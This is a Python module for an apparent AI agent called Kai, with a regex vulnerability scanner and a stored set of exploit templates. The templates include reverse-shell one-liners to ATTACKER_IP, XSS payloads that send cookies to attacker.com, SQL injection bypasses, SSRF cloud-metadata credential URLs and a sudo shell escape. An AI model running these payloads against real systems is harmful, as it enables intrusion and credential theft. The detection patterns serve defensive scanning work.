"""
Kai SecurityEngine — vulnerability patterns, exploit templates, OWASP knowledge, and security intelligence.
Makes Kai proficient in real security analysis, exploit development, and defensive coding.
"""
from __future__ import annotations

import json
import re
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Optional


def _utc_now_iso() -> str:
    return datetime.now(timezone.utc).replace(microsecond=0).isoformat()


@dataclass
class VulnPattern:
    """A known vulnerability pattern with detection rules."""
    id: str
    name: str
    cwe: str
    severity: str  # critical, high, medium, low, info
    languages: list[str]
    description: str
    detection_regex: str
    fix_pattern: str
    references: list[str] = field(default_factory=list)
    cvss_score: float = 0.0
    examples: list[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "id": self.id,
            "name": self.name,
            "cwe": self.cwe,
            "severity": self.severity,
            "languages": self.languages,
            "description": self.description,
            "fix": self.fix_pattern,
            "cvss": self.cvss_score,
            "references": self.references[:3],
        }


@dataclass
class ExploitTemplate:
    """An exploit technique template."""
    id: str
    name: str
    category: str  # web, binary, network, crypto, social_engineering
    difficulty: str  # easy, medium, hard, expert
    description: str
    prerequisites: list[str] = field(default_factory=list)
    steps: list[str] = field(default_factory=list)
    tools: list[str] = field(default_factory=list)
    example_payload: str = ""
    mitigations: list[str] = field(default_factory=list)
    references: list[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "id": self.id,
            "name": self.name,
            "category": self.category,
            "difficulty": self.difficulty,
            "description": self.description,
            "prerequisites": self.prerequisites,
            "steps": self.steps,
            "tools": self.tools,
            "mitigations": self.mitigations,
        }


@dataclass
class SecurityFinding:
    """A security finding from analysis."""
    id: str
    title: str
    severity: str
    category: str
    location: str
    description: str
    evidence: str
    impact: str
    remediation: str
    references: list[str] = field(default_factory=list)
    cvss_score: float = 0.0
    cwe: str = ""
    confidence: str = "high"  # high, medium, low

    def to_dict(self) -> dict:
        return {
            "id": self.id,
            "title": self.title,
            "severity": self.severity,
            "category": self.category,
            "location": self.location,
            "description": self.description,
            "evidence": self.evidence[:500],
            "impact": self.impact,
            "remediation": self.remediation,
            "cvss": self.cvss_score,
            "cwe": self.cwe,
            "confidence": self.confidence,
        }


class SecurityEngine:
    """Security knowledge base and analysis engine."""

    def __init__(self, workspace: Path) -> None:
        self.workspace = workspace
        self.knowledge_path = workspace / "memory" / "security_knowledge.json"
        self.knowledge_path.parent.mkdir(parents=True, exist_ok=True)

        self.vuln_patterns: list[VulnPattern] = []
        self.exploit_templates: list[ExploitTemplate] = []
        self.findings: list[SecurityFinding] = []

        self._load_knowledge()
        if not self.vuln_patterns:
            self._init_builtin_patterns()
        if not self.exploit_templates:
            self._init_builtin_exploits()

    def _load_knowledge(self) -> None:
        if self.knowledge_path.exists():
            try:
                data = json.loads(self.knowledge_path.read_text(encoding="utf-8"))
                for vp in data.get("vuln_patterns", []):
                    self.vuln_patterns.append(VulnPattern(**vp))
                for et in data.get("exploit_templates", []):
                    self.exploit_templates.append(ExploitTemplate(**et))
            except Exception:
                pass

    def _save_knowledge(self) -> None:
        payload = {
            "vuln_patterns": [v.to_dict() for v in self.vuln_patterns],
            "exploit_templates": [e.to_dict() for e in self.exploit_templates],
            "updated_at": _utc_now_iso(),
        }
        self.knowledge_path.write_text(json.dumps(payload, indent=2), encoding="utf-8")

    def _init_builtin_patterns(self) -> None:
        """Initialize with known vulnerability patterns."""
        patterns = [
            # SQL Injection
            VulnPattern(
                id="sql_injection_001",
                name="SQL Injection (String Concatenation)",
                cwe="CWE-89",
                severity="critical",
                languages=["python", "php", "java", "javascript", "csharp"],
                description="SQL query built via string concatenation or f-string with user input.",
                detection_regex=r'(?:execute|query|cursor\.execute|Connection\.create)\s*\(\s*(?:f["\']|["\'].*%s|["\'].*\+|["\'].*\{)',
                fix_pattern="Use parameterized queries: cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))",
                references=["https://owasp.org/www-community/attacks/SQL_Injection", "https://cwe.mitre.org/data/definitions/89.html"],
                cvss_score=9.8,
                examples=["cursor.execute(f'SELECT * FROM users WHERE id = {user_id}')", "query = \"SELECT * FROM users WHERE name = '\" + name + \"'\""],
            ),
            VulnPattern(
                id="sql_injection_002",
                name="SQL Injection (ORM Bypass)",
                cwe="CWE-89",
                severity="high",
                languages=["python", "javascript", "typescript"],
                description="Raw SQL passed through ORM, or user input used in raw query methods.",
                detection_regex=r'(?:raw|execute_sql|where_raw|from_raw)\s*\(',
                fix_pattern="Use ORM query builders instead of raw SQL. If raw SQL is necessary, use parameterization.",
                references=["https://owasp.org/www-community/attacks/SQL_Injection"],
                cvss_score=8.6,
            ),

            # XSS
            VulnPattern(
                id="xss_001",
                name="Cross-Site Scripting (Reflected)",
                cwe="CWE-79",
                severity="high",
                languages=["python", "javascript", "php", "java", "csharp"],
                description="User input directly rendered in HTML without sanitization.",
                detection_regex=r'(?:innerHTML|document\.write|dangerouslySetInnerHTML|Response\.Write|echo\s+\$_GET|\.html\(.*\+)',
                fix_pattern="Sanitize output: use textContent instead of innerHTML, or use a templating engine with auto-escaping.",
                references=["https://owasp.org/www-community/attacks/xss/", "https://cwe.mitre.org/data/definitions/79.html"],
                cvss_score=7.5,
            ),

            # Command Injection
            VulnPattern(
                id="cmd_injection_001",
                name="OS Command Injection",
                cwe="CWE-78",
                severity="critical",
                languages=["python", "php", "javascript", "ruby", "bash"],
                description="User input passed to shell command execution.",
                detection_regex=r'(?:os\.system|subprocess\.(?:call|run|Popen)|exec\(|passthru\(|shell_exec\(|`.*\$\{|`.*\+)',
                fix_pattern="Use subprocess.run with list args: subprocess.run(['ls', '-la', user_path], capture_output=True). Never use shell=True with user input.",
                references=["https://owasp.org/www-community/attacks/Command_Injection", "https://cwe.mitre.org/data/definitions/78.html"],
                cvss_score=9.8,
                examples=["os.system(f'ping {user_input}')", "subprocess.run(f'grep {pattern} file.txt', shell=True)"],
            ),

            # Path Traversal
            VulnPattern(
                id="path_traversal_001",
                name="Path Traversal / Directory Traversal",
                cwe="CWE-22",
                severity="high",
                languages=["python", "php", "java", "javascript", "csharp"],
                description="User input used in file path without validation, allowing ../ escape.",
                detection_regex=r'(?:open|read_file|include|require|send_file)\s*\(\s*(?:.*\+.*path|.*f["\'].*\{|.*\.\.\/)',
                fix_pattern="Validate and sanitize paths: os.path.abspath(os.path.join(base_dir, user_input)).startswith(base_dir)",
                references=["https://owasp.org/www-community/attacks/Path_Traversal", "https://cwe.mitre.org/data/definitions/22.html"],
                cvss_score=7.5,
            ),

            # Insecure Deserialization
            VulnPattern(
                id="deser_001",
                name="Insecure Deserialization",
                cwe="CWE-502",
                severity="critical",
                languages=["python", "java", "php"],
                description="Untrusted data passed to pickle.loads, unserialize, or ObjectInputStream.",
                detection_regex=r'(?:pickle\.loads|yaml\.load\s*\([^,)]+\)|marshal\.loads|unserialize\s*\(|ObjectInputStream)',
                fix_pattern="Use safe loaders: yaml.safe_load(data). Never use pickle.loads on untrusted data. Use JSON instead.",
                references=["https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data", "https://cwe.mitre.org/data/definitions/502.html"],
                cvss_score=9.8,
                examples=["obj = pickle.loads(user_data)", "data = yaml.load(request.body)  # missing Loader argument"],
            ),

            # Hardcoded Secrets
            VulnPattern(
                id="hardcoded_secret_001",
                name="Hardcoded Secret / API Key",
                cwe="CWE-798",
                severity="high",
                languages=["python", "javascript", "java", "csharp", "go", "ruby"],
                description="API keys, passwords, or tokens hardcoded in source code.",
                detection_regex=r'(?:api_key|apikey|secret_key|password|token|auth_token)\s*=\s*["\'][A-Za-z0-9_\-]{16,}["\']',
                fix_pattern="Use environment variables or a secrets manager: os.environ.get('API_KEY'). Use .env files (never commit them).",
                references=["https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password", "https://cwe.mitre.org/data/definitions/798.html"],
                cvss_score=7.4,
            ),

            # SSRF
            VulnPattern(
                id="ssrf_001",
                name="Server-Side Request Forgery",
                cwe="CWE-918",
                severity="high",
                languages=["python", "php", "java", "javascript", "go"],
                description="User-controlled URL used in server-side HTTP request.",
                detection_regex=r'(?:requests\.(?:get|post|put|delete)|urllib\.request\.urlopen|fetch\s*\(|http\.Get)\s*\(\s*(?:.*\+|.*f["\']|.*req\.|.*params)',
                fix_pattern="Validate URLs against an allowlist. Block internal IPs (10.*, 192.168.*, 172.16-31.*, 127.*, 169.254.*).",
                references=["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery", "https://cwe.mitre.org/data/definitions/918.html"],
                cvss_score=8.6,
            ),

            # IDOR
            VulnPattern(
                id="idor_001",
                name="Insecure Direct Object Reference",
                cwe="CWE-639",
                severity="medium",
                languages=["python", "php", "java", "javascript", "csharp"],
                description="Object ID from user input used without authorization check.",
                detection_regex=r'(?:get_object|find_by_id|where.*id\s*=\s*request|params\[:id\]|req\.params\.id)',
                fix_pattern="Add authorization check: verify the current user owns or has access to the requested object.",
                references=["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References", "https://cwe.mitre.org/data/definitions/639.html"],
                cvss_score=6.5,
            ),

            # Weak Crypto
            VulnPattern(
                id="weak_crypto_001",
                name="Weak Cryptographic Algorithm",
                cwe="CWE-327",
                severity="medium",
                languages=["python", "javascript", "java", "csharp", "go"],
                description="Use of MD5, SHA1, DES, RC4, or other deprecated cryptographic algorithms.",
                detection_regex=r'(?:MD5\.|SHA1\.|DES\.|RC4\.|md5\(|sha1\(|hashlib\.md5|hashlib\.sha1|Algorithm:\s*(?:MD5|SHA1|DES))',
                fix_pattern="Use SHA-256 or SHA-3 for hashing. Use AES-256-GCM for encryption. Use bcrypt/argon2 for password hashing.",
                references=["https://owasp.org/www-community/vulnerabilities/Use_of_a_Broken_or_Risky_Cryptographic_Algorithm", "https://cwe.mitre.org/data/definitions/327.html"],
                cvss_score=5.9,
            ),

            # XXE
            VulnPattern(
                id="xxe_001",
                name="XML External Entity (XXE)",
                cwe="CWE-611",
                severity="high",
                languages=["python", "java", "php", "csharp"],
                description="XML parsing without disabling external entity resolution.",
                detection_regex=r'(?:xml\.parse|XMLParser|SAXParser|DocumentBuilder|simplexml_load_string)\s*\(',
                fix_pattern="Disable external entities: parser = etree.XMLParser(resolve_entities=False, no_network=True). Use defusedxml library.",
                references=["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing", "https://cwe.mitre.org/data/definitions/611.html"],
                cvss_score=7.5,
            ),
        ]
        self.vuln_patterns = patterns
        self._save_knowledge()

    def _init_builtin_exploits(self) -> None:
        """Initialize with common exploit techniques."""
        exploits = [
            ExploitTemplate(
                id="sql_injection_basic",
                name="SQL Injection — Authentication Bypass",
                category="web",
                difficulty="easy",
                description="Bypass authentication by injecting SQL that always evaluates to true.",
                prerequisites=["SQL-based authentication", "No parameterized queries"],
                steps=[
                    "Identify login form with username/password fields",
                    "Test with payload: ' OR '1'='1' -- in username field",
                    "Alternative: admin' -- in username, any password",
                    "If vulnerable, login succeeds without valid credentials",
                    "Enumerate database: ' UNION SELECT table_name, NULL FROM information_schema.tables --",
                ],
                tools=["sqlmap", "burpsuite", "manual"],
                example_payload="' OR 1=1 --",
                mitigations=["Use parameterized queries", "Implement prepared statements", "Use ORM with safe query builders"],
            ),
            ExploitTemplate(
                id="rce_command_injection",
                name="Remote Code Execution via Command Injection",
                category="web",
                difficulty="medium",
                description="Execute arbitrary OS commands through vulnerable web application inputs.",
                prerequisites=["User input passed to shell command", "No input sanitization"],
                steps=[
                    "Identify input point that interacts with system commands (ping, nslookup, file upload with processing)",
                    "Test with: ; id or | whoami or && echo pwned",
                    "If response includes command output, RCE is confirmed",
                    "Establish reverse shell: bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1",
                    "Or use: python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
                ],
                tools=["netcat", "burpsuite", "python"],
                example_payload="; cat /etc/passwd",
                mitigations=["Never pass user input to shell commands", "Use subprocess with list args, no shell=True", "Implement strict input validation"],
            ),
            ExploitTemplate(
                id="xss_stored",
                name="Stored XSS — Persistent Payload",
                category="web",
                difficulty="easy",
                description="Inject malicious JavaScript that is stored and served to other users.",
                prerequisites=["User input stored in database", "Output rendered without escaping"],
                steps=[
                    "Find input stored and displayed to other users (comments, profiles, messages)",
                    "Inject payload: <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
                    "Or use img tag: <img src=x onerror=\"fetch('https://attacker.com/log?c='+document.cookie)\">",
                    "Wait for victim to view the page",
                    "Cookie/session is sent to attacker's server",
                ],
                tools=["burpsuite", "beef", "custom"],
                example_payload="<script>document.location='https://attacker.com/?c='+document.cookie</script>",
                mitigations=["Output encoding/escaping", "Content-Security-Policy headers", "HttpOnly cookie flag", "Input sanitization"],
            ),
            ExploitTemplate(
                id="ssrf_cloud_metadata",
                name="SSRF — Cloud Metadata Access",
                category="web",
                difficulty="medium",
                description="Access internal cloud metadata services through SSRF vulnerability.",
                prerequisites=["Server makes HTTP requests to user-controlled URLs", "Running in cloud environment (AWS, GCP, Azure)"],
                steps=[
                    "Identify URL parameter or input used in server-side HTTP request",
                    "Test with internal URLs: http://169.254.169.254/latest/meta-data/",
                    "AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                    "GCP: http://metadata.google.internal/computeMetadata/v1/",
                    "Extract credentials, pivot to cloud API access",
                ],
                tools=["burpsuite", "curl", "custom"],
                example_payload="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                mitigations=["URL allowlisting", "Block internal IP ranges", "Disable metadata service or require IMDSv2"],
            ),
            ExploitTemplate(
                id="buffer_overflow_basic",
                name="Buffer Overflow — Stack-based",
                category="binary",
                difficulty="hard",
                description="Overflow a stack buffer to overwrite return address and redirect execution.",
                prerequisites=["Compiled binary without stack canaries", "No ASLR or ASLR bypass available", "Executable stack or ROP chain possible"],
                steps=[
                    "Identify buffer: find input that causes crash with long string",
                    "Determine offset: use pattern_create/pattern_offset or cyclic",
                    "Find JMP ESP or similar gadget: msf-pattern_offset or ropper",
                    "Craft payload: NOP sled + shellcode + return address",
                    "Test locally, then remote",
                ],
                tools=["gdb", "pwntools", "msfvenom", "ropper"],
                example_payload="python -c \"print('A'*260 + '\\xef\\xbe\\xad\\xde' + '\\x90'*16 + shellcode)\"",
                mitigations=["Stack canaries", "ASLR", "DEP/NX", "Stack cookies", "Bounds checking"],
            ),
            ExploitTemplate(
                id="privilege_escalation_linux",
                name="Linux Privilege Escalation — SUID/Kernel",
                category="system",
                difficulty="medium",
                description="Escalate from low-privilege user to root on Linux systems.",
                prerequisites=["Shell access to Linux system", "Misconfigured SUID binaries OR vulnerable kernel"],
                steps=[
                    "Enum: find / -perm -4000 -type f 2>/dev/null (SUID binaries)",
                    "Check sudo -l for allowed commands",
                    "Check for writable cron jobs: ls -la /etc/cron*",
                    "Check kernel version: uname -a (search for known exploits)",
                    "Exploit: GTFOBins for SUID binaries (https://gtfobins.github.io)",
                    "Or kernel exploit: searchsploit linux kernel <version>",
                ],
                tools=["linpeas", "linenum", "sudo", "find", "searchsploit"],
                example_payload="sudo find / -exec /bin/sh \\; -quit",
                mitigations=["Remove unnecessary SUID bits", "Patch kernel regularly", "Restrict sudo with NOPASSWD", "Use AppArmor/SELinux"],
            ),
        ]
        self.exploit_templates = exploits
        self._save_knowledge()

    # === ANALYSIS ===

    def scan_code_for_vulns(self, code: str, language: str = "python") -> list[SecurityFinding]:
        """Scan code against known vulnerability patterns."""
        findings = []
        for pattern in self.vuln_patterns:
            if language not in pattern.languages:
                continue
            try:
                matches = re.finditer(pattern.detection_regex, code, re.IGNORECASE)
                for match in matches:
                    line_num = code[:match.start()].count("\n") + 1
                    line_content = code.split("\n")[line_num - 1].strip()

                    findings.append(SecurityFinding(
                        id=f"{pattern.id}_line{line_num}",
                        title=pattern.name,
                        severity=pattern.severity,
                        category=self._categorize_cwe(pattern.cwe),
                        location=f"line {line_num}",
                        description=pattern.description,
                        evidence=line_content[:300],
                        impact=self._severity_impact(pattern.severity),
                        remediation=pattern.fix_pattern,
                        references=pattern.references[:3],
                        cvss_score=pattern.cvss_score,
                        cwe=pattern.cwe,
                        confidence="medium",
                    ))
            except re.error:
                continue

        findings.sort(key=lambda f: f.cvss_score, reverse=True)
        return findings

    def scan_file_for_vulns(self, filepath: str | Path) -> list[SecurityFinding]:
        """Scan a file for vulnerabilities."""
        path = Path(filepath)
        if not path.exists():
            return [SecurityFinding(
                id="error",
                title="File Not Found",
                severity="info",
                category="error",
                location=str(path),
                description=f"File not found: {path}",
                evidence="",
                impact="Cannot scan file.",
                remediation="Check the file path.",
            )]

        from kai_agent.code_intelligence import detect_language
        language = detect_language(path)
        code = path.read_text(encoding="utf-8", errors="replace")
        findings = self.scan_code_for_vulns(code, language)
        for f in findings:
            f.location = f"{path.name}:{f.location}"
        return findings

    def scan_project_for_vulns(self, root: str | Path) -> list[SecurityFinding]:
        """Scan entire project for security issues."""
        root = Path(root)
        all_findings = []
        scan_extensions = {".py", ".js", ".ts", ".php", ".java", ".cs", ".rb", ".go", ".html", ".jsp", ".aspx"}

        for file_path in root.rglob("*"):
            if file_path.is_file() and file_path.suffix.lower() in scan_extensions:
                # Skip common non-source dirs
                skip_dirs = {"node_modules", "venv", ".venv", "__pycache__", ".git", "dist", "build", ".next"}
                if any(skip in file_path.parts for skip in skip_dirs):
                    continue
                try:
                    findings = self.scan_file_for_vulns(file_path)
                    all_findings.extend(findings)
                except Exception:
                    continue

        all_findings.sort(key=lambda f: f.cvss_score, reverse=True)
        return all_findings

    def find_exploit_techniques(self, category: str | None = None, difficulty: str | None = None) -> list[dict]:
        """Find relevant exploit techniques."""
        results = []
        for exploit in self.exploit_templates:
            if category and exploit.category != category:
                continue
            if difficulty and exploit.difficulty != difficulty:
                continue
            results.append(exploit.to_dict())
        return results

    def get_exploit_by_id(self, exploit_id: str) -> Optional[dict]:
        """Get a specific exploit template."""
        for exploit in self.exploit_templates:
            if exploit.id == exploit_id:
                return exploit.to_dict()
        return None

    def get_vuln_by_id(self, vuln_id: str) -> Optional[dict]:
        """Get a specific vulnerability pattern."""
        for pattern in self.vuln_patterns:
            if pattern.id == vuln_id:
                return pattern.to_dict()
        return None

    def search_vulns(self, query: str) -> list[dict]:
        """Search vulnerability patterns by keyword."""
        query_lower = query.lower()
        results = []
        for pattern in self.vuln_patterns:
            blob = f"{pattern.name} {pattern.description} {pattern.cwe}".lower()
            if query_lower in blob:
                results.append(pattern.to_dict())
        return results

    def search_exploits(self, query: str) -> list[dict]:
        """Search exploit templates by keyword."""
        query_lower = query.lower()
        results = []
        for exploit in self.exploit_templates:
            blob = f"{exploit.name} {exploit.description} {' '.join(exploit.tools)}".lower()
            if query_lower in blob:
                results.append(exploit.to_dict())
        return results

    # === REPORTING ===

    def build_report(self, findings: list[SecurityFinding], target: str = "") -> dict:
        """Build a structured security report."""
        severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        for f in findings:
            severity_counts[f.severity] = severity_counts.get(f.severity, 0) + 1

        risk_score = sum(
            {"critical": 10, "high": 8, "medium": 5, "low": 2, "info": 1}.get(f.severity, 0)
            for f in findings
        )

        return {
            "target": target,
            "scan_date": _utc_now_iso(),
            "total_findings": len(findings),
            "severity_breakdown": severity_counts,
            "risk_score": risk_score,
            "risk_level": self._risk_level(risk_score),
            "findings": [f.to_dict() for f in findings],
            "executive_summary": self._executive_summary(findings, target),
            "recommendations": self._top_recommendations(findings),
        }

    def _executive_summary(self, findings: list[SecurityFinding], target: str) -> str:
        critical = [f for f in findings if f.severity == "critical"]
        high = [f for f in findings if f.severity == "high"]

        if not findings:
            return f"No security vulnerabilities found in {target or 'the target'}."

        parts = [f"Security scan of {target or 'target'} identified {len(findings)} finding(s)."]
        if critical:
            parts.append(f"CRITICAL: {len(critical)} critical vulnerability(ies) require immediate attention.")
            parts.append(f"  - {', '.join(f.title for f in critical[:3])}")
        if high:
            parts.append(f"HIGH: {len(high)} high-severity finding(s) should be addressed promptly.")
        return " ".join(parts)

    def _top_recommendations(self, findings: list[SecurityFinding]) -> list[str]:
        recs = set()
        for f in findings:
            recs.add(f.remediation)
        return list(recs)[:10]

    # === HELPERS ===

    def _severity_impact(self, severity: str) -> str:
        impacts = {
            "critical": "Full system compromise. Remote code execution, data breach, or complete auth bypass.",
            "high": "Significant security impact. Unauthorized access, data exposure, or privilege escalation.",
            "medium": "Moderate risk. Limited unauthorized access or information disclosure.",
            "low": "Minor issue. Defense-in-depth improvement recommended.",
            "info": "Informational. Best practice or hardening suggestion.",
        }
        return impacts.get(severity, "Unknown impact.")

    def _categorize_cwe(self, cwe: str) -> str:
        categories = {
            "CWE-89": "injection",
            "CWE-79": "xss",
            "CWE-78": "command_injection",
            "CWE-22": "path_traversal",
            "CWE-502": "deserialization",
            "CWE-798": "secrets",
            "CWE-918": "ssrf",
            "CWE-639": "authorization",
            "CWE-327": "cryptography",
            "CWE-611": "xxe",
        }
        return categories.get(cwe, "other")

    def _risk_level(self, score: int) -> str:
        if score >= 50:
            return "critical"
        elif score >= 30:
            return "high"
        elif score >= 15:
            return "medium"
        elif score >= 5:
            return "low"
        return "minimal"

    def status(self) -> dict:
        return {
            "vuln_patterns_loaded": len(self.vuln_patterns),
            "exploit_templates_loaded": len(self.exploit_templates),
            "categories": sorted(set(e.category for e in self.exploit_templates)),
            "languages_covered": sorted(set(lang for p in self.vuln_patterns for lang in p.languages)),
            "severity_distribution": {
                sev: sum(1 for p in self.vuln_patterns if p.severity == sev)
                for sev in ["critical", "high", "medium", "low", "info"]
            },
        }
